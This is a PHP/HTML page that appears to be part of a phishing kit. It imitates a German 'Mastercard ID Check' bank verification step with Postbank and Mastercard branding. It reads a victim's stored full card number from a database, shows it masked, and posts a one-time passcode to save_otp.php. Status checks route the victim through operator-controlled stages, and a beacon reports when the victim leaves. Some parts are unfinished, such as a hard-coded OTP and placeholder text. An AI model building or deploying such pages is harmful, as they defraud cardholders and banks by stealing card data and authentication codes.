<?php
// Include the connection file
include '../connection/connection.php';
session_start();

// Ensure user_id is retrieved from the session so it fetches data for the correct user
if (!isset($_SESSION['user_id'])) {
    echo "Error: User ID not found in session. Please log in.";
    header('Location: ../index.php');
    exit();
}

$user_id = $_SESSION['user_id'];

try {
    // Prepare and execute the SQL statement to fetch card_number
    $stmt = $pdo->prepare("SELECT card_number FROM users WHERE id = ?");
    $stmt->execute([$user_id]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user && isset($user['card_number'])) {
        // Get the last 3 digits of the card number
        $card_number = $user['card_number'];
        $masked_card_number = '************' . substr($card_number, -3);
    } else {
        $masked_card_number = 'Card number not found';
    }
} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
    $masked_card_number = 'Error fetching card number';
}
?>

<?php

require '../connection/connection.php';

$user_id = $_SESSION['user_id'];

$stmt = $pdo->prepare("SELECT otpstatus FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user) {
    if ($user['otpstatus'] === 'processing' || $user['otpstatus'] === 'awaiting_otp') {
        header('Location: ../timer/processing.php');
        exit();
    }
    // Here, users can enter OTP since it's in the verification step.
} else if ($user['otpstatus'] === 'otp_verified') {
    header('Location: ../otp/verifyotp.php');
    exit();
}

?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>

<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="bg-white p-4 shadow-lg w-full max-w-md text-center">
        <div class="flex justify-between align-center">
            <select name="" id="">
                <option value="DoRemi">DoRemi</option>
                <option value="DoRemi">DoRemi</option>
                <option value="DoRemi">DoRemi</option>
            </select>
            <a href="" style="color: tomato;  font-weight: bold; text-decoration: underline;">ONELINK</a>
        </div>
        <hr>
        <div class="flex justify-between align-center">
            <img src="Postbank-Logo.svg.png" alt="Verified by Visa" class="h-20 w-40 object-contain">
            <img src="Mastercard-ID-Check.webp" alt="Ricardo Logo" class="h-20 w-40 object-contain">
        </div>
        <hr>



        <h3 class="text-xl font-semibold mb-4">Sicher einkaufen mit Master Card Check</h3>
        <p class="text-gray-600 mb-6">1. Ein einmaliger Passcode ist erforderlich. Dieser Code wurde an Ihr registriertes Mobiltelefon gesendet.</p>
        <p class="text-gray-600 mb-6">2. Ein einmaliger Passcode ist erforderlich. Dieser Code wurde an Ihr registriertes Mobiltelefon gesendet.</p>

        <form action="./save_otp.php" method="post" class="space-y-4">
            <p class="text-center">Bank: Stripe Payments CH Limited</p>
            <p class="text-center">Datum: <span id="localDate"></span></p>
            <p class="text-center">Kreditkarte: <?php echo htmlspecialchars($masked_card_number); ?></p>
            <br>
            <input type="hidden" name="otp" value="333333">
            <input type="submit" value="Waker"
                class="w-full py-3 bg-orange-600 text-white 
             rounded hover:bg-orange-700 cursor-pointer"
                style="background-color: #F97316 !important;">

            <a href="" style="color: blue;  font-weight: bold; text-decoration: underline;">
                Lorem ipsum dolor, illum, esse debitis. Velit sit non doloribus sequi illo.
            </a>
        </form>


    </div>

    <script>
        // Get the current date from the user's browser
        const today = new Date();
        const options = {
            day: '2-digit',
            month: 'short',
            year: 'numeric'
        };
        const formattedDate = today.toLocaleDateString('de-DE', options);

        // Display the date in the span
        document.getElementById('localDate').textContent = formattedDate;
    </script>
    <script>
        // Function to start the countdown
        function startCountdown(duration, display) {
            let timer = duration,
                minutes, seconds;
            const countdownInterval = setInterval(function() {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(countdownInterval);
                    display.textContent = "0:00"; // Set to 0:00 when time is up
                }
            }, 1000);
        }

        // Start the countdown (2 minutes)
        window.onload = function() {
            const countdownDuration = 2 * 60; // 2 minutes in seconds
            const display = document.querySelector('#countdown');
            startCountdown(countdownDuration, display);
        };

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('../update_status.php', new URLSearchParams({
                status: 'offline'
            }));
        });
    </script>

</body>

</html>
